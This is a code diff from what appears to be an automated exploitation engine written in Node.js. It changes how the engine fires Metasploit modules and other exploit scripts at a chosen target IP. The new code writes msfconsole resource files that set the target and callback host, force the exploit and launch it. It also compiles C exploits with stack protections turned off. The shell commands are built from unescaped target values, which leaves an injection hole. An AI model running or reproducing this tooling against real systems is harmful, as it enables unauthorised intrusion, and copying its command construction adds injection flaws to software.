@@ -700,57 +700,46 @@ except:
                         logger.info(`Executing exploit ${exploit.id} (${exploitData.language}) for ${targetIp}:${targetPort} [Confidence: ${exploit.match_confidence || 'N/A'}%]`);
 
                         let cmd = '';
-                        // Metasploit Execution Wrapper
+                        // Metasploit Execution Wrapper - use msfconsole -x for reliable execution
                         if (exploit.source === 'metasploit' || (exploitData.language === 'ruby' && exploitData.code.includes('Msf::'))) {
                             const msfRoot = path.join(__dirname, '..', 'data', 'metasploit');
-                            const wrapperContent = `
-$LOAD_PATH.unshift(File.join('${msfRoot}', 'lib'))
-begin
-  require 'msf/core'
-rescue LoadError
-  puts "Error: Metasploit libraries not found. Ensure gems are installed."
-  exit 1
-end
+                            const msfConsole = path.join(msfRoot, 'msfconsole');
 
-# Load the module
-module_path = '${exploitData.filePath}'
-require module_path
+                            // Derive the module path from the exploit_db_id (e.g. "exploits/windows/smb/ms08_067_netapi")
+                            const modulePath = exploit.exploit_db_id || '';
 
-# Instantiate
-klass = ObjectSpace.each_object(Class).find { |c| c < Msf::Exploit || c < Msf::Auxiliary }
-if klass
-  instance = klass.new
-  # Minimal framework mock/stub if full framework not available
-  # In a real setup, we would need Msf::Simple::Framework.create
-  # but that requires DB connection etc.
-  # We try to run it standalone if possible, or attempt framework create.
-  begin
-    instance.framework = Msf::Simple::Framework.create(:module_types => [])
-  rescue
-    # Fallback or fail
-  end
+                            // Build msfconsole resource commands
+                            const rcLines = [];
+                            rcLines.push('use ' + modulePath);
+                            rcLines.push('set RHOSTS ' + targetIp);
+                            rcLines.push('set RPORT ' + (targetPort || exploit.port || 80));
+                            if (lhost) rcLines.push('set LHOST ' + lhost);
+                            if (lport) rcLines.push('set LPORT ' + lport);
+                            rcLines.push('set ForceExploit true');
+                            // Use exploit -z to run in background (non-interactive) or 'run' for auxiliary
+                            if (modulePath.startsWith('auxiliary') || modulePath.startsWith('post')) {
+                                rcLines.push('run');
+                            } else {
+                                rcLines.push('exploit -z');
+                            }
+                            rcLines.push('exit');
 
-  # Set Datastore
-  instance.datastore['RHOSTS'] = '${targetIp.replace(/'/g, "\\'")}'
-  instance.datastore['RPORT'] = '${(targetPort || 80).toString().replace(/'/g, "\\'")}'
-  ${lhost ? `instance.datastore['LHOST'] = '${lhost.replace(/'/g, "\\'")}'` : ''}
-  ${lport ? `instance.datastore['LPORT'] = '${lport.toString().replace(/'/g, "\\'")}'` : ''}
-  instance.datastore['ForceExploit'] = true
+                            const rcFile = path.join(tmpDir, 'exploit.rc');
+                            fs.writeFileSync(rcFile, rcLines.join("\n") + "\n");
 
-  puts "Running #{instance.name}..."
-  instance.exploit
-else
-  puts "Module class not found"
-end
-`;
-                            const wrapperFile = path.join(tmpDir, 'msf_wrapper.rb');
-                            fs.writeFileSync(wrapperFile, wrapperContent);
-                            cmd = `ruby "${wrapperFile}"`;
+                            // Check if msfconsole exists
+                            if (fs.existsSync(msfConsole)) {
+                                cmd = 'cd "' + msfRoot + '" && ruby "' + msfConsole + '" -q -r "' + rcFile + '"';
+                            } else {
+                                // Fallback: try system-installed msfconsole
+                                cmd = 'msfconsole -q -r "' + rcFile + '"';
+                            }
                         }
-                        else if (exploitData.language === 'python') cmd = `python3 "${tempFile}"`;
-                        else if (exploitData.language === 'ruby') cmd = `ruby "${tempFile}"`;
-                        else if (exploitData.language === 'bash') cmd = `bash "${tempFile}"`;
-                        else if (exploitData.language === 'perl') cmd = `perl "${tempFile}"`;
+                        else if (exploitData.language === 'python') cmd = 'python3 "' + tempFile + '"';
+                        else if (exploitData.language === 'ruby') cmd = 'ruby "' + tempFile + '"';
+                        else if (exploitData.language === 'bash') cmd = 'bash "' + tempFile + '"';
+                        else if (exploitData.language === 'perl') cmd = 'perl "' + tempFile + '"';
+
                         else if (exploitData.language === 'java') {
                             // Check if javac exists
                             try {
@@ -765,16 +754,12 @@ end
                                 });
                                 continue;
                             }
-
-                            // Compile then run
                             const classPath = tmpDir;
                             await execPromise(`javac "${tempFile}"`);
-                            // Run java with classpath
                             cmd = `java -cp "${classPath}" ${filename}`;
                         }
                         else if (exploitData.language === 'c') {
                             const binFile = path.join(tmpDir, 'exploit.bin');
-                            // Use lenient flags: -w (no warnings), -fno-stack-protector (often needed for buffer overflow exploits), -z execstack
                             await execPromise(`gcc -w -fno-stack-protector -z execstack "${tempFile}" -o "${binFile}"`);
                             cmd = `"${binFile}"`;
                         } else {
